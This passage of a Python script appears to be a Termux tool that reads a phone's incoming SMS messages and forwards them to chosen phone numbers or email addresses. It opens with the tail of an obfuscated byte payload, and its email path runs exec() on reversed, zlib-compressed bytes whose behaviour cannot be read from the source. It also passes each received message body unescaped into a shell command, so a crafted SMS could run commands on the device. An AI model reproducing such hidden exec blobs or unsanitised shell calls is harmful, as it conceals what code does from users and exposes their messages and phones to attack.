\xab\xfa`\xdfF\x1b"\xf2\xa9\xae\x9d5\x9a\xd1\xf40\xb5dP6\x18\xe6\x89wTKM\x04\xf8i\x876~\xf1\xa8\xdf\xe5\x90k\xd9\xe8ao>\xc9E\xc5\x1c\xf2@g\x08x\x93\xce3\x9f<z+R\xa1\x91\x82\x0c\xee\xff\xa5\xafvx\xfd\x97\t\xa0c\xba\xd4\xb1w\xb20\xf1\xd2\x8b\xa4%\xd5\x90e\xec\xea\x1f\x9bf\x8eA\xd9\xb8\xbd\xdb;\x06w\xe6@\x16\xc7\xd1\x92\xf7_Z\x9el\xf9~;$\xa4\xf4\xcb\xd1_\xa7[>J\x8fNF\x81\xe0\xa3\xf9\x04\xbd\x1fa\xa7\xce<\xa2\x1fA\xe8Y\x04V\x17\xfc\xb8R\x0fEy\xe9W/GGG\xe4\xd2\xacG\xb8E\xdb\xed\xc3\xcb\x0fn\xb5\xbdMg\xf2\x16\x05R\xe9\xaa.w\xc9mK\xdb\xa5[;\x94\x1d\xdc\xaa\xc4\x1fr\xb3\x93\xaerP\xb2\xc67h\xac\xbeh\x15\xb9T\xf9\x9b\xe1\x96\xcc\x1f\xf2\xeeW1\xc9\x97\xffa\xcf!\x9fH\xd4M\x0c->u\xbf\xe5\x0f=K~(\x03Y\xfb\xe9\x98\xc0fc\x0b>21\xae$w\xa1%t\xc0ad\xfb\x82\xa2\xa9[\xe9\xa3\xd9<\xd9\xfa\x84\xfai\xf3\xbb\xa7\xb3O\x9d\xff\x9e\xe5\xedBc\xb3D?\xa3\x0f\xaa\xb6\x83\x17\xd7\xf3\xc8\x06\xba\xa6Z\xbe]\xd3\xcbN\xa6\xbb{\xb6\x85l2\r\x87\t\xb0\xfd\xa42\xe1\xec\x93u\x8f,\xd9\xff\x89)\x7f\xc9\xaf\x12\x91\x15\xd3\xfaaC7\xec\xecB\x1a\xb4\xd6!\r\xa9>Z/eu\xa6"\xf6C\xed\xae\x96\x9dP\xb7\xb0y\x94Ak5\xf9\xad\xbc@tf\x17r\x1d\x94\xea\x11\xbe\xba\x91St\xb8n7\x8ae[\x9e\xc7\xce\x96\xe3e\xe6\xaf\x03\xd8T\x9b\xb8\xe8\xbe\xaeR\xd9\xebvO\xad\x0f\x7f\xd8a\xefB\xd8|\x9e\xb6r\xfd\x80j\x8e\xc7\x8d\x0fZr\x19}=n\x13\xb3\xd5\x92\xf2qU7\x06\x98r\x19\x10Sk\x06\x82E\xdf\r\xcf\xac\x14\xbb\xe4Y\xedd\xa7\\\x88{\x13\xa4\x8c9\xf6\x8dVN\xbd\xc8\xa6\xb5\xd5\x90\x8al\xed\xa9r\x87\x04M\xa9P\xf6\xc8o\xa8\xd0\xa7\xd6{\xaa^nhr\x87\x05v5\xfd\xa5V\xcd\xeb\x04\xf8\x83\xbb\x91\xf3Y`\xea\xf2t\xebw\x18\x1a\xbdg,\x06\xaf\xa9\xf3\x01w\x90\x1a\x81\'\xcb\x06\xbf\xcdeX\xd5\xa2e\xe2u\x9d\x1bv\xf7\x07\xb4\xf8\x12\xf4\xe6\xd5j\x06\x19PSt\xd4\xce\xb2)q\xb2\xf4\xaf6\xc5Q\xa2\xe6A\x14\x08A\x1d$;\xf9\x9cF)q\x01\xb7\xacC]3\xd6\xc4\xf3\xc9\x98\xd4r\xd3I!nQqDk3\x92\xd2\xdc\x9d[\x86\xf2\x8f u\x03Wi\xae \x89\x8f\x14\xa1f\x9dN\xfdr\t\xfa\x9bRT\xcd\xccV\x12\xeb\xa8\xf2\x16\xc7\x9f+\xc8\x0c\x08Uv\xaa\x1d\x88x\xc0S\xf2\xb3\x02vk{\xf5*\xe9\xde`F\xa8\x0c\x8b\x06\x9c\xa4\xc7L\x15\x04\x92]H6uV=\xe8\x82\x85\xcb\x1e\xb4-\xd8\x19\xa8\x87f\xa2\xf0\xc5\xcf\xef\xeeGu\xf1\xd1\xa3}\n\xe7K\xab\xa2Z\xe9\xdc\x93\\\xec^\xd0\x91t\xd7\x0b\xef\xe0Y1\xa6iA& k+I\xb8\xda*\x1ctk0\xaa\x8d\x0c\x8eYc\xe7\xe7<8w[\x1e\x9c\xe9\xd7\xbd\x064]"\xd5t\xf2\x0e\xee\xd8\x14\x143qmg\xcc\x0f\x1c\x9dV\xc1\xab1\xa6\xd3\xa1\xb2\xa0\xb0\xd9}F\xf6\xef\xb9\xb7\xb8\x90\xe9\xddk\xc5$\xb2\x89m\x14\xeaj\xd3\x90\xe0\xd4\x84\x89\xd7{w\xaba\x92_\xa3\xfam\xb8I\xd1u>\xe3p\x822\xa7\xe1\xf8L\x8c\xe0\xe2\xf2\x05C?j\xe8p\xadF\xd9\xfa\xcaLe\xfd\xbdy\x84\x87SAj\xb5\x01\xa5e\x89R\xc2\xdb\xa5K\x12\x02\\\xde\x82\xd6\x07b\xb9\xca7\xc7hD\x1f\xa8m)\xc0\xb8q.\x8a\xcdv\xba__\xce\xcf\x10;E\x93Q VO\x8b\x83Iu$\x07\x98-Q\xddR\\\x86k\xfe\xe8R\tS\xe9\x08Y}r\\W\x8b\x9c,\x10\x96a\xa2\xe4\xe5\x9a\x87\xfb\x19\xc0e\x04\xd5\xf0\xb0\x7f\xf77\xe9\xf9\x15\\\xce\xb1\xa9=\xe6\x01T\x87\x07S\x03e\xa1-.\x82\x8e\xe4\xb3\xef\xd0\x8aVp\x89\xaf5(\xbb?5I\xb9z\x93\xbc\xd3\xa6\xb3\xcd\xeex\xb3/\xa5\xc1\xd9r\xf3\xb8\x95\x9cv\xe4\xc9\x16\x07>K7b\xde}\xf6Y\xf7\xd9\xa7x\xb9I;\xc7\x130\x97\xee\x9dVWO\x93\xaf\xef\x16_)pC\xab1\x0c\xa7\xfda\xdf\xb5\xc7\xb9L\xc6C5\xedH\xba!\xd5\xe2\xcb$\xeb\xe8C\xd76\xfbuyI\x96\x85\x82|s\x04W\x0eA^\x94\xba\xa4 \xf7\xe7\xe3u\x07\x8aP\xd0\x01l\xb9\x05\x02\xc4\xcc\xc1\x9fi\xe3!g\xac>\xacV\x18p,{\xb6\xda)k:\x16\x92/u\x01\x16\x0fSy\xf2n\xb6\xb1\xb0\xeb\x1c\x8a\x06\x170\x10\xef\xd6A<\xde\x80\t\xf3!BN\xb6\xad\x87\xe2\xaaR\x07\x95X\x8d\xb0\n\x93\xb5\xe1H\xa9Y\xcb\x8b\xb8\x88\xee^\x05y\xd04\xe7\xa3\x8aG\x08\x1b\xcbm\xce\xe7\xdbVA\x8f\xa1\x95.Z\n <\x18\xc2\x1d\x13\xb4\x9fb\xf3O&lk\x0f\x14\x15\x83\\F\t\xa3\x84(\xa1\x10\xd9V=\x80\xc7\xb4\xa0\xb7(\xc9M\xd6}\xcas\xde ,BIdA(q\xf16\xd7\xb6\x1aO\xb6\xc2\x8b3+\x08o\x14\xb8UUI\x13{\xb15P\x9fM\xa1\x8dU\x9e\xd0\x9b\xae\xc4 9f\x85\x99Mb\n\xa5\xe7&7\x05=\xae\x84zb2\x9f`\xe6\xdc<\xe4\xf6\x90{\xd2IF\xb7\x12X\xa5\x16\xd30\x85\xb5\xb2\x8f+\x9c\x06M\x1a\x18\n[\xecLO!U\xd0D\x94\xd2f$\x85\x9d\xfd@p\xaeh\xe8\x15\xa59\x7f\xe9^\xad?n\x07>\xe1\xd3\\\xc4x-v\xe7`y+\xbb\xac\x94\xb3\xd9\xf1\xf8)\x17\xb3fN\x85\x9c\xaam\xe0\x16\x8e\x7f\xe0\x89\xd4\xd9\x0b\x12\xee\x0339Ec\xeeB*\xe0Ri\x033\x06M\xe4g\x18\x85\xa25\xcd\x90\x85rC\xd1\xac\x1a!\n\xf4\xbbT\xb6\xfa\x81M>b%\xc2\xc6"\xe4}\x1a\xea\xfa\xf2\xc9\xf2\xa8\xa3\xa72\xf3G\xd3\xe7\xfcZ\x89!a\xe3\x90o \xb5MV\xc8\xaa!P\x08\x13\xf3\x19)\xf7\x8c,\xdd\x11w$\xd0\xa9O)%\xa6\x81\x99\x93\'\x16O\xb0t\xa6\xfb\x14U\r \xc7\x1f\x931\x0e\xa1\xb2\\-\xe5]LF\x16\xa6\x11L\xe1\xc8\x19B\xe48\x92\x86\xc6\x16@p\xc4aD\x04#R\xed\x81\xbe\x0b\xf4\xf3g\xcb\xf8\x15<\x82B\xedGr\xee\x7f2\x00\x8e\x8e\x8e\x04\x00\xfd~\xef\xd7\xd7\x0f\xab\xfcS\x9f\xf4\x04\xbf`\x95\xb1\xf3\xa2dc\x02R\x8d\x84\xf9\x195\xb3\x02C(\x8a \\V?$a\x90-\x02\xc1\xb3\xe0\x86z\xd8\xf8\xae\x17R\xec\x10O)\x18\xf8_\x821\xc4M\x81E\x88\xc7"\xb1r?\xa9\x80C\xf70\x9a\xe8VK\x94Q\xbfs\xc3\xa3\xe5\x8d\x17X}\x9d\xa7n\xfd\xd49\xf7\xf9\x04\xec\xb2\x92\x15"D\xc5\xb4IAE\xb4\xbe\xee\x90\x0c\x19\x16\x0c\xce\xdb\xb7h\xdbUI\xd6\xe7l\x8d=\x8d\xd0j\xc1_\xbd\xf68\xdbn\xdb\x1a\xd5\x9cx'))



def SendNumber(to, data):                 # Define a function called SendNumber with two parameters to and data
    def SendNumberCheck(number, data):    # Define a nested function called SendNumberCheck with two parameters number and data
        try:
            subprocess.getoutput(f"termux-sms-send -n {number} {data}")   # Use the subprocess module to send an SMS message to the specified number
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))   # Use the subprocess module to get details of the last 10 SMS messages
            for data in details:            # Loop through the details of the messages
                try:
                    if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):  # Check if the received time of the message matches the current time
                        if (data['sender'] == 'You'):      # Check if the sender of the message is the user
                            if (data['type'] == 'failed'):  # Check if the message sending failed
                                return False              # Return False if any of the checks failed
                except: pass
            return True                         # Return True if all checks passed
        except: return False                    # Return False if an exception occurred during message sending or message checking
    if not (SendNumberCheck(to, data)):        # Call the nested function SendNumberCheck with the specified number and data, and check if it returned False
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending failed
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()   # Display the message
    else:                                     # If SendNumberCheck returned True
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending succeeded
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()  # Display the message

STORE, ID = [], ""
def SendSMS(TO, SVE):
    try:
        global ID
        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
        for data in details:
            SmsID = data["_id"]
            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                SmsID = str(SmsID)
                if (re.search(SmsID, ID)) : SMSLBAR()
                else:
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
                    for to in TO:
                        if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf3\x1e\xce\xc7\x00\x13_$\xa4P:\x8afJbjQFIz\x9ep\x95)\xf9I\xf9\xc1)\x16\xa5&\xe6\x95\xe7\xc8\x80Q\xd5\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IH\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                        else: SendNumber(to, data["body"])
                    ID += SmsID
            else: SMSLBAR()
    except KeyboardInterrupt: EXIT(False)
    except json.decoder.JSONDecodeError :
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def SMSLBAR():
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")

def EmailMenu():
    try:
        Banner()
        if not (Internet()):
            print()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║    {blue}Check your internet connection...     {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║           {blue}Choose An Option...            {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║",30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}TRY AGAIN                  {red}║",30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║",30)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): EmailMenu()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║      {blue}Enter emails separated by '{green},{blue}'       {red}║", 25)
            center(f"╠══════════════════════════════════════════╝")
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            Emails = Input.split(",")
            Filter = []
            for email in Emails:
                if (email == ""): continue
                else: Filter.append(email)
            if (len(Filter) == 0): EmailMenu()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Emails", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, True)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def PHMenu():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
        center(f"╠══════════════════════════════════════════╝")
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        Numbers = Input.split(",")
        Filter = []
        for number in Numbers:
            if (number == ""): continue
            else: Filter.append(number)
        if (len(Filter) == 0): PHMenu()
        else:
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, False)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def MENU():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║           {blue}Choose An Option...            {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝\n",5)
        center(f"{magenta}[{white}01{magenta}]  {yellow}Forward Messages Via Email          ",20)
        center(f"{magenta}[{white}02{magenta}]  {yellow}Forward Messages Via Phone Number   ",20)
        center(f"{magenta}[{white}03{magenta}]  {yellow}About Tool                          ",20)
        center(f"{magenta}[{white}04{magenta}]  {yellow}Usage                               ",20)
        center(f"{magenta}[{white}05{magenta}]  {yellow}Update Tool                         ",20)
        center(f"{magenta}[{white}06{magenta}]  {yellow}More From Us                        ",20)
        center(f"{magenta}[{white}07{magenta}]  {yellow}Exit....                           \n",20)
        center(f"{red}╔═══════════════════════════════════════════",5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): EmailMenu()
        elif (Input == "2") or (Input == "02") or (Input == "two"): PHMenu()
        elif (Input == "3") or (Input == "03") or (Input == "three"): About()
        elif (Input == "4") or (Input == "04") or (Input == "four"): Usage()
        elif (Input == "5") or (Input == "05") or (Input == "five"): Update()
        elif (Input == "6") or (Input == "06") or (Input == "six"): os.system("termux-open-url https://github.com/GreyTechno"), MENU()
        elif (Input == "7") or (Input == "07") or (Input == "seven"): EXIT()
        else: 
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║       {magenta}Invalid Option Try Again...        {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

# line checks whether the current script is being run as the main program or if it has been imported into another script. If it is being run as the main program, the code within the following block will be executed.
if (__name__ == "__main__"):
    sys.stdout.write(f"\r{yellow}Checking Updates...") # prints the message "Checking Updates..." to the console with the text color in yellow.
    # The termux_api() function is called and checks if the Termux API is available on the device. If the API is not available, the Installer() function is called to install the Termux API
    if not (termux_api()): os.system("pip install requests secure-smtplib")
    # If the API is available, Internet() function is called to check if there is an internet connection. If there is an internet connection, CheckVersion() function is called to check for updates.
    else:
        # Finally, if there is no command detected (i.e., cmd() returns False), the MENU() function is called to display the main menu.
        if (Internet()): sys.stdout.write(f"\r{yellow}Checking Updates..."), CheckVersion()
        if not (cmd()): MENU()
